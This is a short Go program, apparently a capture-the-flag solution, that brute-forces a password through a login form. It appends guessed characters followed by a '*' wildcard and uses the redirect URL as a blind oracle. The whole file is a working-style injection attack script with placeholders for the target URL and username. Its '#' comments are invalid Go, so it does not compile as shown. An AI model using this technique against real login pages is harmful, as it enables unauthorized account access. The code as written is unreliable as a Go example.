package main

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"
)

# input URL to bruteforce
const (
	URL = "/login"
)

func checkLogin(formData url.Values) bool {
	response, err := http.PostForm(URL, formData)
	if err != nil {
		fmt.Println(err)
	}
	defer response.Body.Close()

	redir := response.Request.URL.String()

	return !strings.Contains(redir, "Authentication")

}

func main() {
	flag := ""
	str := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890@_$%!&{}"
	counter := 0

	for {
		if counter == len(str) {
			fmt.Printf("%s", flag)
			break
		}
		password := fmt.Sprintf("%s%c*", flag, str[counter])
		formData := url.Values{
			# add suspected username
			"username": {""},
			"password": {password},
		}

		if checkLogin(formData) {
			flag = fmt.Sprintf("%s%c", flag, str[counter])
			fmt.Println(flag)
			counter = 0
		} else {
			counter += 1
		}
	}
}
